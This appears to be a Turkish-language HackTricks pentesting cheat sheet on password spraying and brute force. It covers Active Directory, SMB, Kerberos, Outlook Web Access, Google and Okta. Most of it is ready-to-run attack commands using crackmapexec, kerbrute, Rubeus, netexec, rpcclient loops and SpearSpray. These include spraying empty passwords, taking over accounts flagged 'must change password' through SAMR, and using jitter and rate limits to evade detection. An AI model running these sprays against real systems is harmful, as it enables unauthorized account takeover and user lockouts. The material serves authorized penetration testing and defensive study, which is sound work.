# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Birkaç **geçerli kullanıcı adı** bulduktan sonra keşfettiğiniz her kullanıcı için en **yaygın parolaları** deneyebilirsiniz (ortamın parola politikasını göz önünde bulundurun).\
**Varsayılan** **minimum** **parola** **uzunluğu** **7**'dir.

Yaygın kullanıcı adları listeleri de faydalı olabilir: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Dikkat: **birden fazla yanlış parola denerseniz bazı hesapları kilitleyebilirsiniz** (varsayılan olarak 10'dan fazla).

### Parola politikasını öğrenme

Eğer bazı kullanıcı kimlik bilgilerine veya domain kullanıcısı olarak bir shell'e sahipseniz, **parola politikasını şu şekilde alabilirsiniz**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Linux (veya tüm platformlar) üzerinden istismar

- **crackmapexec** kullanarak:
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- [**kerbrute**](https://github.com/ropnop/kerbrute) kullanımı (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(hesap kilitlenmelerini önlemek için deneme sayısını belirtebilirsiniz):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) kullanımı (python) - TAVSİYE EDİLMEZ - BAZEN ÇALIŞMAYABİLİR
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- **Metasploit**'in `scanner/smb/smb_login` modülü ile:

![](<../../images/image (745).png>)

- **rpcclient** kullanılarak:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Windows'tan

- Brute module içeren [Rubeus](https://github.com/Zer1t0/Rubeus) sürümü ile:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) ile (Varsayılan olarak domain'den kullanıcılar oluşturabilir ve parola politikasını domain'den alır ve deneme sayılarını buna göre sınırlar):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Kullanarak [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### "Password must change at next logon" Hesaplarını Tespit Etme ve Ele Geçirme (SAMR)

Düşük gürültülü bir teknik, zararsız/boş bir password spray yapıp STATUS_PASSWORD_MUST_CHANGE döndüren hesapları yakalamaktır; bu, parolanın zorla geçersiz kılındığını ve eski parolayı bilmeden değiştirilebileceğini gösterir.

İş akışı:
- Kullanıcıları enumerate ederek (RID brute via SAMR) hedef listesini oluşturun:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Spray boş bir password deneyin ve hits'lerde devam ederek next logon'da parola değiştirmek zorunda olan hesapları ele geçirin:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Her başarılı eşleşme için, SAMR üzerinden NetExec’in modülüyle parolayı değiştirin ("must change" ayarlı olduğunda eski parola gerekmez):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Operasyonel notlar:
- Kerberos tabanlı işlemlerden önce host saatinin DC ile senkronize olduğundan emin olun: `sudo ntpdate <dc_fqdn>`.
- Bazı modüllerde (ör. RDP/WinRM) (Pwn3d!) olmayan bir [+], creds'in geçerli olduğunu ancak hesabın etkileşimli oturum açma haklarına sahip olmadığını gösterir.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)

Kerberos pre-auth–based spraying, SMB/NTLM/LDAP bind attempts'e kıyasla gürültüyü azaltır ve AD lockout policies ile daha iyi uyum sağlar. SpearSpray, LDAP-driven targeting, bir pattern engine ve policy awareness (domain policy + PSOs + badPwdCount buffer) ile hassas ve güvenli bir şekilde spray yapar. Ayrıca ele geçirilmiş principal'ları BloodHound pathing için Neo4j'de etiketleyebilir.

Key ideas:
- LDAP kullanıcı keşfi (sayfalandırma ve LDAPS desteği), isteğe bağlı olarak özel LDAP filtreleri kullanılarak.
- Domain lockout policy + PSO-aware filtreleme ile yapılandırılabilir bir deneme tamponu (threshold) bırakılarak kullanıcıların kilitlenmesinin önlenmesi.
- Hızlı gssapi bindings kullanarak Kerberos pre-auth doğrulaması (DC'lerde 4625 yerine 4768/4771 oluşturur).
- Pattern-based, kullanıcı başına parola oluşturma; isimler ve her kullanıcının pwdLastSet'inden türetilen zaman değerleri gibi değişkenleri kullanır.
- İşlem hacmi kontrolü: iş parçacıkları (threads), jitter ve saniye başına maksimum istek ile.
- İsteğe bağlı Neo4j entegrasyonu ile ele geçirilmiş kullanıcıları BloodHound için işaretleme.

Basic usage and discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Hedefleme ve desen kontrolü:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Gizlenme ve güvenlik kontrolleri:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound zenginleştirme:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Desen sistemi genel bakışı (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Kullanılabilir değişkenler şunlardır:
- {name}, {samaccountname}
- Her kullanıcının pwdLastSet (veya whenCreated) değerinden zamanla ilgili: {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Bileşim yardımcıları ve organizasyon tokeni: {separator}, {suffix}, {extra}

Operasyonel notlar:
- En yetkili badPwdCount ve politika ile ilgili bilgileri okumak için -dc ile PDC-emulator sorgulamayı tercih edin.
- badPwdCount sıfırlamaları gözlem penceresinden sonraki bir sonraki denemede tetiklenir; güvende kalmak için eşik ve zamanlamayı kullanın.
- Kerberos pre-auth denemeleri DC telemetrilerinde 4768/4771 olarak görünür; karışmak için jitter ve rate-limiting kullanın.

> İpucu: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.

## Outlook Web Access

p**assword spraying outlook** için birden fazla araç vardır.

- İle [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- İle [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- İle [Ruler](https://github.com/sensepost/ruler) (güvenilir!)
- İle [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- İle [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Bu araçların herhangi birini kullanmak için bir kullanıcı listesine ve bir parola ya da küçük bir parola listesine ihtiyacınız vardır.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Kaynaklar

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)


{{#include ../../banners/hacktricks-training.md}}
